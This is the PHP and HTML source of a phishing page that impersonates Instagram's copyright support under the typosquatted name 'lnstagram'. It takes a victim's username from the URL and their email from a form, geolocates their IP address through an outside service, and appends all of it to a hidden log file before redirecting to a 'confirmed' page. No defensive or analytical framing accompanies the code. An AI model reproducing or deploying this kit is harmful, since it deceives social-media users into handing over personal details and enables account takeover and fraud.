<?php

 $user = $_GET["username"];

if($_POST){
$mail = $_POST["mail"];

$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('soullordtxt.php', 'a');
fwrite($file,"
<font color='red'>Kullanıcı Adı: </font><font color='black'>".$user."</font><br>
<font color='green'>Mail : </font><font color='black'>".$mail."</font><br>
<font color='red'>Tarih: </font><font color='black'>".$cur_time."</font><br>
<font color='red'>İp Adresi: </font><font color='black'>".$ip."</font><br>
    <font color='red'>Konum: </font><font color='black'>".$ulke."</font><br>
");
fclose($file);
echo '';
    header("Location: confirmed.php");
}

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>lnstagram Copyright Services</title>
	<meta name="description" content="lnstagram Copyright Direct Message Support.">
	<link rel="stylesheet" href="anil.css">
	<meta name="wiewport" content="width=device-width">
	<link rel="shortcut icon" href="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png">
</head>
<style type="text/css">
	
#scmoruk{
    border:1px solid #dedede;
    height:0px;
    width:100%;

}

#menu{
	border:2px solid #dedede;
	width:310px;
	height:400px;

}

</style>
<center><br><img src="data:image/png;base64,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" width="150" style="margin-bottom:10px;">
<br><br><div id="scmoruk">
	</div></center>



<center><br><br>
	<div id="menu">
		<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1-DjUJ1UJd41jhB1K_jI7jMdVNUMSwp-_1g&usqp=CAU" width="200">
   <h3 style="font-family:sans-serif; font-weight:400;line-height:10px;font-size:25px;">Mail Confirmation</h3>

   <p style="font-family:sans-serif; font-size:17px; color: #999; line-height:20px; font-weight:350; margin-top:15px;">Please Enter Your Mail İnformation And<br>Click "Request Verification".</p>

   <form method="post">
<input required="" name="mail" required="" style="padding:6px; 
    background:#fafafa; 
    outline:none;
    width:250px; 
    height:15px; 
    border:5px solid #dedede; 
    font-family:sans-serif; 
    font-weight:350;
    flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
    border: 1px solid #e6e6e6;    
    text-overflow: ellipsis;
    font: 400 13.3333px Arial; 
    border-radius:3px;" type="text" name="mail" placeholder="Mail">
    <br><br>
<button type="submit" style="color:white; width:100%; outline:0; border:0; border-radius:3px;   
    background: #3897f0;
    border-color: #3897f0;    
    font-size: 14px; 
    font-weight:bold; 
    height:33px;
    width:200px;" value="submit">Request Verification</button>



</center>




<center>
   	<br>
     <li style="font-family:sans-serif; margin-top:6px; color: #999">
     	
          lnstagram 2022 Copyright &COPY
      </li></center></form></div></center>



     </li>
  











</html>